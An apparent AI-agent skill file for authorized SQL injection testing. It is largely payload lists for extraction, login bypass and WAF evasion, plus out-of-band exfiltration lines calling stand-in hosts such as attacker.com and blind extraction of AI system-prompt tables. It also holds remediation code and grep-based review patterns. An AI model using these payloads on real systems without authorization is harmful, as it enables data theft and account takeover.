---
name: sql-injection-testing
description: "SQL injection testing **specialist** — use when the user explicitly wants to test for SQL injection, check if a database query is safe, find injection vulnerabilities, audit a Supabase backend, or says 'can this be injected', 'is this query safe', 'test SQLi'. Covers JSON field-name injection (the blind spot used in the McKinsey Lilli breach March 2026), Supabase/PostgreSQL JSONB patterns, PostgREST-specific injection surfaces, and AI platform targets (system prompt endpoints, session history APIs, RAG search). Also covers standard in-band, blind, and time-based injection. Always requires written authorization before live testing.

Does NOT apply to generic security review — for broad code/system audits, defer to `vulnerability-scanner`; for pre-build architecture, defer to `ai-system-build-gate`. This skill is the SQLi deep-dive consulted from those broader reviews."
metadata:
  version: "1.2"
---

# SQL Injection Testing

## Purpose

Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.

## Inputs / Prerequisites

### Required Access
- Target web application URL with injectable parameters
- Burp Suite or equivalent proxy tool for request manipulation
- SQLMap installation for automated exploitation
- Browser with developer tools enabled

### Technical Requirements
- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
- Knowledge of HTTP request/response cycle
- Familiarity with database schemas and structures
- Write permissions for testing reports

### Legal Prerequisites
- Written authorization for penetration testing
- Defined scope including target URLs and parameters
- Emergency contact procedures established
- Data handling agreements in place

## Outputs / Deliverables

### Primary Outputs
- SQL injection vulnerability report with severity ratings
- Extracted database schemas and table structures
- Authentication bypass proof-of-concept demonstrations
- Remediation recommendations with code examples

### Evidence Artifacts
- Screenshots of successful injections
- HTTP request/response logs
- Database dumps (sanitized)
- Payload documentation

## Core Workflow

### Phase 1: Detection and Reconnaissance

#### Identify Injectable Parameters
Locate user-controlled input fields that interact with database queries:

```
# Common injection points
- URL parameters: ?id=1, ?user=admin, ?category=books
- Form fields: username, password, search, comments
- Cookie values: session_id, user_preference
- HTTP headers: User-Agent, Referer, X-Forwarded-For
```

#### Test for Basic Vulnerability Indicators
Insert special characters to trigger error responses:

```sql
-- Single quote test
'

-- Double quote test
"

-- Comment sequences
--
#
/**/

-- Semicolon for query stacking
;

-- Parentheses
)
```

Monitor application responses for:
- Database error messages revealing query structure
- Unexpected application behavior changes
- HTTP 500 Internal Server errors
- Modified response content or length

#### Logic Testing Payloads
Verify boolean-based vulnerability presence:

```sql
-- True condition tests
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--
page.asp?id=1" or 1=1--

-- False condition tests  
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```

Compare responses between true and false conditions to confirm injection capability.

### Phase 2: Exploitation Techniques

#### UNION-Based Extraction
Combine attacker-controlled SELECT statements with original query:

```sql
-- Determine column count
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Continue until error occurs

-- Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Error-Based Extraction
Force database errors that leak information:

```sql
-- MSSQL version extraction
1' AND 1=CONVERT(int,(SELECT @@version))--

-- MySQL extraction via XPATH
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- PostgreSQL cast errors
1' AND 1=CAST((SELECT version()) AS int)--
```

#### Blind Boolean-Based Extraction
Infer data through application behavior changes:

```sql
-- Character extraction
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- Conditional responses
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

#### Time-Based Blind Extraction
Use database sleep functions for confirmation:

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

#### Out-of-Band (OOB) Extraction
Exfiltrate data through external channels:

```sql
-- MSSQL DNS exfiltration
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--

-- MySQL DNS exfiltration
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--

-- Oracle HTTP request
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### Phase 3: Authentication Bypass

#### Login Form Exploitation
Craft payloads to bypass credential verification:

```sql
-- Classic bypass
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- Username enumeration
admin' AND '1'='1
admin' AND '1'='2
```

Query transformation example:
```sql
-- Original query
SELECT * FROM users WHERE username='input' AND password='input'

-- Injected (username: admin'--)
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check bypassed via comment
```

### Phase 4: Filter Bypass Techniques

#### Character Encoding Bypass
When special characters are blocked:

```sql
-- URL encoding
%27 (single quote)
%22 (double quote)
%23 (hash)

-- Double URL encoding
%2527 (single quote)

-- Unicode alternatives
U+0027 (apostrophe)
U+02B9 (modifier letter prime)

-- Hexadecimal strings (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' in hex
```

#### Whitespace Bypass
Substitute blocked spaces:

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users
SEL/**/ECT/**/username/**/FR/**/OM/**/users

-- Alternative whitespace
SELECT%09username%09FROM%09users  -- Tab character
SELECT%0Ausername%0AFROM%0Ausers  -- Newline
```

#### Keyword Bypass
Evade blacklisted SQL keywords:

```sql
-- Case variation
SeLeCt, sElEcT, SELECT

-- Inline comments
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Double writing (if filter removes once)
SELSELECTECT → SELECT
UNUNIONION → UNION

-- Null byte injection
%00SELECT
SEL%00ECT
```

## Constraints and Guardrails

### Operational Boundaries
- Never execute destructive queries (DROP, DELETE, TRUNCATE) without explicit authorization
- Limit data extraction to proof-of-concept quantities
- Avoid denial-of-service through resource-intensive queries
- Stop immediately upon detecting production database with real user data

### Technical Limitations
- WAF/IPS may block common payloads requiring evasion techniques
- Parameterized queries prevent standard injection
- Some blind injection requires extensive requests (rate limiting concerns)
- Second-order injection requires understanding of data flow

### Legal and Ethical Requirements
- Written scope agreement must exist before testing
- Document all extracted data and handle per data protection requirements
- Report critical vulnerabilities immediately through agreed channels
- Never access data beyond scope requirements

## Phase 5: JSON Field-Name Injection (Scanner Blind Spot)

> **Why this matters:** Standard SQLi scanners test parameter *values*. When field names, JSON keys, or column selectors are interpolated from user input, scanners pass clean — but the app is critically vulnerable. This is the exact vector used in the McKinsey "Lilli" AI platform breach (March 2026), where 27 vulnerabilities went undetected by automated tools, exposing 43,000 employees' data for $20.

### How It Differs from Standard SQLi

```
Standard SQLi:   GET /api/user?id=1' OR 1=1--        ← value is injected
Field-name SQLi: GET /api/data?field=id' OR 1=1--     ← column/key NAME is injected
```

The second never appears in standard scanner test suites. The resulting query:
```sql
-- Vulnerable backend builds:
SELECT data->>'id' OR 1=1--' FROM sessions
```

### Detection: Finding Injectable Field Names

Look for API endpoints that accept field selectors, sort columns, or JSON key names as parameters:

```
# Common parameter names that control field selection
?field=...
?column=...
?key=...
?sort=...
?orderBy=...
?select=...
?filter[field]=...
?include=...
```

**Reconnaissance step:** Check API documentation, OpenAPI/Swagger specs, and GraphQL introspection for parameters that select or filter by field name.

### Testing JSON Field-Name Injection (PostgreSQL/Supabase JSONB)

```sql
-- Test 1: Quote in field name (triggers parse error if vulnerable)
GET /api/data?field=name'

-- Test 2: Boolean logic in field name
GET /api/data?field=name' OR '1'='1

-- Test 3: JSONB operator injection
GET /api/data?field=name'::text) FROM users--

-- Test 4: Subquery via field name
GET /api/data?field=(SELECT version())--

-- Test 5: Timing-based blind confirmation
GET /api/data?field=name' AND (SELECT pg_sleep(5))--
```

### Extracting Data via JSON Field-Name Blind Injection

Once confirmed vulnerable, extract via timing (no output displayed):

```sql
-- Confirm system prompt table exists
?field=name' AND (SELECT 1 FROM system_prompts LIMIT 1)=1 AND pg_sleep(3)--

-- Extract first character of system prompt
?field=name' AND ASCII(SUBSTRING((SELECT content FROM system_prompts LIMIT 1),1,1))>64 AND pg_sleep(3)--

-- Binary search extraction loop (automate with script)
?field=name' AND ASCII(SUBSTRING((SELECT content FROM system_prompts LIMIT 1),{pos},1))>{char} AND pg_sleep(2)--
```

### Supabase-Specific Patterns to Test

Supabase uses PostgREST which accepts column selectors in query parameters:

```
# PostgREST column selection (legitimate feature, injection surface)
GET /rest/v1/sessions?select=id,content,system_prompt

# Test injection in select parameter
GET /rest/v1/sessions?select=id,(SELECT%20version())

# Test in filter column
GET /rest/v1/sessions?id=eq.1&system_prompt=not.is.null

# Directly query system tables if RLS absent
GET /rest/v1/pg_stat_user_tables   ← should return 403, not data
GET /rest/v1/system_prompts        ← should return 403, not data
```

### Code Review: Spotting Vulnerable Patterns

```javascript
// ❌ CRITICAL: Field name from request interpolated into query
app.get('/api/data', async (req, res) => {
  const field = req.query.field;                          // ← user-controlled
  const result = await db.query(
    `SELECT ${field} FROM user_data WHERE user_id = $1`,  // ← INJECTABLE
    [req.user.id]
  );
});

// ❌ CRITICAL: JSONB key from user input
const key = req.body.key;
const query = `SELECT metadata->>'${key}' FROM sessions`; // ← INJECTABLE

// ❌ CRITICAL: ORDER BY column from user input
const sort = req.query.sort;
const query = `SELECT * FROM results ORDER BY ${sort}`;   // ← INJECTABLE

// ✅ SAFE: Whitelist validation before use
const ALLOWED_FIELDS = ['name', 'email', 'created_at'];
const field = req.query.field;
if (!ALLOWED_FIELDS.includes(field)) {
  return res.status(400).json({ error: 'Invalid field' });
}
const result = await db.query(
  `SELECT ${field} FROM user_data WHERE user_id = $1`,
  [req.user.id]
);
```

### Grep Patterns for Code Review

```bash
# Find dynamic field/column names in SQL (high priority)
grep -rn "\`SELECT \${" . --include="*.js" --include="*.ts"
grep -rn "ORDER BY \${" . --include="*.js" --include="*.ts"
grep -rn "->>'\\$\|->\\$" . --include="*.js" --include="*.ts"

# Find JSONB operators with dynamic input
grep -rn "req\.\(query\|body\|params\)" . | grep -E "->|jsonb|column|field|sort|order"

# Find Supabase queries with dynamic column selection
grep -rn "\.select(\`\|\.order(\`" . --include="*.js" --include="*.ts"

# Find unparameterized query construction
grep -rn "query\s*=.*\`\|query\s*=.*+\s*req" . --include="*.js" --include="*.ts"
```

### AI Platform-Specific Targets

When testing AI platforms (RAG, chatbots, LLM apps), prioritize these injection surfaces:

| Target | Why It Matters |
|--------|---------------|
| Session/conversation history API | Expose other users' chats |
| System prompt retrieval endpoint | Read AI behavioral instructions |
| Document/embedding search API | Dump RAG knowledge base |
| User context injection fields | Inject into prompt construction |
| Feedback/rating endpoints | Often less hardened, same DB access |

---

## Troubleshooting

### No Error Messages Displayed
- Application uses generic error handling
- Switch to blind injection techniques (boolean or time-based)
- Monitor response length differences instead of content

### UNION Injection Fails
- Column count may be incorrect → Test with ORDER BY
- Data types may mismatch → Use NULL for all columns first
- Results may not display → Find injectable column positions

### WAF Blocking Requests
- Use encoding techniques (URL, hex, unicode)
- Insert inline comments within keywords
- Try alternative syntax for same operations
- Fragment payload across multiple parameters

### Payload Not Executing
- Verify correct comment syntax for database type
- Check if application uses parameterized queries
- Confirm input reaches SQL query (not filtered client-side)
- Test different injection points (headers, cookies)

### Time-Based Injection Inconsistent
- Network latency may cause false positives
- Use longer delays (10+ seconds) for clarity
- Run multiple tests to confirm pattern
- Consider server-side caching effects

---

For quick-reference payload lists and worked examples, see [reference.md](reference.md).
